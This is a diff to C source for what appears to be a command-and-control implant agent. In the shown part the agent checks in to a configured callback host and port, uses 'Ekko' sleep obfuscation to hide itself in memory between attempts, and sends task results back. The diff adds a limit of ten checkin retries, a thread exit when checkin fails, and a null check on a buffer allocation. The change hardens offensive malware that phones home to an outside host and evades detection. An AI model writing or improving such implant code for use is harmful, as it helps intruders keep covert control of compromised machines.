@@ -324,11 +324,18 @@ void go(char * coreBase, char * moduleBase, int moduleSize, char * transportModu
     DBG("Agent UUID: %s", state.uuid);
     DBG("Callback: %s:%d%s (ssl=%d)", state.callback_host, state.callback_port, state.callback_uri, state.callback_ssl);
 
-    /* Checkin loop — retry with Ekko sleep on failure */
-    while (!state.connected) {
-        DBG("Attempting checkin...");
-        if (do_checkin(&state)) break;
-        obfuscationEntry(moduleBase, moduleSize, state.sleep_ms);
+    /* Checkin loop — retry with Ekko sleep on failure (max 10 attempts) */
+    {
+        int checkin_retries = 0;
+        while (!state.connected && checkin_retries++ < 10) {
+            DBG("Attempting checkin...");
+            if (do_checkin(&state)) break;
+            obfuscationEntry(moduleBase, moduleSize, state.sleep_ms);
+        }
+        if (!state.connected) {
+            DBG("Checkin failed after 10 attempts - exiting");
+            KERNEL32$ExitThread(0);
+        }
     }
 
     DBG("Connected! Agent ID: %s", state.agent_id);
@@ -403,6 +410,7 @@ void go(char * coreBase, char * moduleBase, int moduleSize, char * transportModu
         if (has_results) {
             int send_len = 1 + result_pb.len;
             unsigned char *send_buf = (unsigned char *)MSVCRT$malloc(send_len);
+            if (!send_buf) { MSVCRT$free(result_pb.data); continue; }
             send_buf[0] = TASK_RESULT;
             MSVCRT$memcpy(send_buf + 1, result_pb.data, result_pb.len);
 
